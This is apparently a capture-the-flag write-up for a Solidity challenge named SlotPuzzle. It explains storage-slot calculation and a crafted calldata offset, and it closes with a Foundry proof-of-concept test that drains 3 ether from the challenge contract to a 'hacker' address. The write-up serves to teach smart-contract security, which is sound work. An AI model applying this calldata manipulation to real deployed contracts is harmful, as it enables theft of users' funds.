# The slot calculation:
From the [doc](https://solidity-fr.readthedocs.io/fr/latest/internals/layout_in_storage.html#mappings-and-dynamic-arrays):

The value corresponding to a mapping `key` is located at `keccak256(key . slotNum)`, we can write a helper function to calculate this:
```solidity 
// calculate slot number of `map[key]`, MK stands for "Map Key"
function MK(uint key, uint mapSelfSlotIndex) public pure returns(uint) {
    return uint(keccak256(abi.encode(key, mapSelfSlotIndex)));
}
```
The value corresponding to `map[key1][key2]` is located at `keccak(key2, keccak(key1, slotNum))`, we use another helper function for this:
```solidity 
// calculate slot number of `map[key1][key2]`, MKK stands for "Map Key Key"
function MKK(uint key1, uint key2, uint mapSelfSlotIndex) public pure returns(uint) {
    uint slot1 = MK(key1, mapSelfSlotIndex);
    return MK(key2, slot1);
}
```
Then, for calculating `ghostInfo[tx.origin][block.number]`, we can do:
```solidity
slot = MKK(uint(uint160(hacker)), block.number, 1);
```
For `.map[block.timestamp][msg.sender]` and rest lines:
```solidity
slot += 1; // Struct member `ghostStore.map` is at slot 1
slot = MKK(block.timestamp, uint(uint160(address(slotPuzzleFactory))), slot);
```
For `.hash.push(ghost);`, it's array type and can be accessed by `keccak256(slot) + index`. Because it's the first element, the `index` is 0, it's simplly `keccak256(slot)`

# Build the `Parameters`
#### The goal:
We need to get 3 ether, but the `payout` limits the amount as 1 ether, so we need to use 3 recipients to get 3 ether.

#### The assembly slot calculation:
```solidity
bytes memory slotKey = params.slotKey;
uint256 offset = params.offset;
assembly {
    offset := calldataload(offset)
    slot := calldataload(add(slotKey, offset))
}
```
- The local variable `slotKey` is the first variable utilizes memory, normally the free memory pointer starts from 0x80, so the `slotKey` is at 0x80.
- It adds `offset` and `slotKey`, and the latter is 0x80, so it's simply `offset + 0x80`.
- The `offset` is a pointer, the real offset is `calldata[offset]`, this value + 0x80 points to the location in the calldata that holds the real slot. We can add an extra 32-bytes to the `Parameters.slotKey` as a trampoline, points to the real slot key, and set the `Parameters.offset` to the trampoline, as:
```solidity
params.slotKey = abi.encode(slot, uint(0x124));
```
To explain this, here's the memory layout of calldata:
```
4 bytes function signature + 
0x0:   0000000000000000000000000000000000000000000000000000000000000020  
0x20:  0000000000000000000000000000000000000000000000000000000000000003 
0x40:  00000000000000000000000000000000000000000000000000000000000001c4  Parameters.offset, points to the last 32 bytes(offset 0x1c0 + 4byte-signature)
0x60:  0000000000000000000000000000000000000000000000000000000000000080  
0x80:  0000000000000000000000000000000000000000000000000000000000000160  
0xa0:  0000000000000000000000000000000000000000000000000000000000000003
0xc0:  000000000000000000000000a63c492d8e9ede5476ca377797fe1dc90eeae7fe
0xe0:  0000000000000000000000000000000000000000000000000de0b6b3a7640000
0x100: 000000000000000000000000a63c492d8e9ede5476ca377797fe1dc90eeae7fe
0x120: 0000000000000000000000000000000000000000000000000de0b6b3a7640000
0x140: 000000000000000000000000a63c492d8e9ede5476ca377797fe1dc90eeae7fe
0x160: 0000000000000000000000000000000000000000000000000de0b6b3a7640000
0x180: 0000000000000000000000000000000000000000000000000000000000000040  Parameters.slotKey
0x1a0: 754b4b7d6f6040542424c2056f8a1f3bc9d0006ff0a20abd08723e65cae65128
0x1c0: 0000000000000000000000000000000000000000000000000000000000000124  0x124+0x80==0x1a4, points to the above line(the real slot number)
```


# POC (Foundry)
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import {SlotPuzzle} from "src/SlotPuzzle.sol";
import {SlotPuzzleFactory} from "src/SlotPuzzleFactory.sol";
import {Parameters,Recipients} from "src/ISlotPuzzleFactory.sol";


contract SlotPuzzleTest is Test {
	SlotPuzzle public slotPuzzle;
	SlotPuzzleFactory public slotPuzzleFactory;
	address hacker;

	function setUp() public {
		slotPuzzleFactory = new SlotPuzzleFactory{value: 3 ether}();
		hacker = makeAddr("hacker");
	}

	function testHack() public {
		vm.startPrank(hacker,hacker);
		assertEq(address(slotPuzzleFactory).balance, 3 ether, "weth contract should have 3 ether");

		//hack time

		uint slot;
		{ // calculate slot
			// for: `ghostInfo[tx.origin][block.number]`
			slot = MKK(uint(uint160(hacker)), block.number, 1);

			// for: `.map[block.timestamp][msg.sender]`
			slot += 1; // Struct member `ghostStore.map` is at slot 1
			slot = MKK(block.timestamp, uint(uint160(address(slotPuzzleFactory))), slot);

			// for: `.map[block.prevrandao][block.coinbase]`
			slot += 1; // Struct member `ghostStore.map` is at slot 1
			slot = MKK(block.prevrandao, uint(uint160(address(block.coinbase))), slot);

			// for: `.map[block.chainid][address(uint160(uint256(blockhash(block.number - block.basefee))))]`
			slot += 1; // Struct member `ghostStore.map` is at slot 1
			slot = MKK(block.chainid, uint(blockhash(block.number - block.basefee)), slot);

			// for: `.hash.push(ghost);`
			slot = uint(keccak256(abi.encode(slot)));
		}

		Parameters memory params;
		{ // build Parameters
			params.totalRecipients = 3; // same as recipients.length
			params.offset = 0x1c4; // points to last 32bytes

			Recipients memory recip; // add `hacker` as recipient 3 times
			recip.account = hacker;
			recip.amount = 1 ether; // has to be 1 ether
			params.recipients = new Recipients[](3);
			for(uint i=0; i<3; i++) {
				params.recipients[i] = recip;
			}

			// append an extra 32bytes(value 0x124) to the end, which acts as
			// a trampoline, points to the real slot
			params.slotKey = abi.encode(slot, uint(0x124));
		}

		slotPuzzleFactory.deploy(params);

		// ---- end of hack ----

		assertEq(address(slotPuzzleFactory).balance, 0, "weth contract should have 0 ether");
		assertEq(address(hacker).balance, 3 ether, "hacker should have 3 ether");

		vm.stopPrank();
	}

	// calculate slot number of `map[key]`
	function MK(uint key, uint mapSelfSlotIndex) public pure returns(uint) {
		return uint(keccak256(abi.encode(key, mapSelfSlotIndex)));
	}
	// calculate slot number of `map[key1][key2]`
	function MKK(uint key1, uint key2, uint mapSelfSlotIndex) public pure returns(uint) {
		uint slot1 = MK(key1, mapSelfSlotIndex);
		return MK(key2, slot1);
	}
}

```
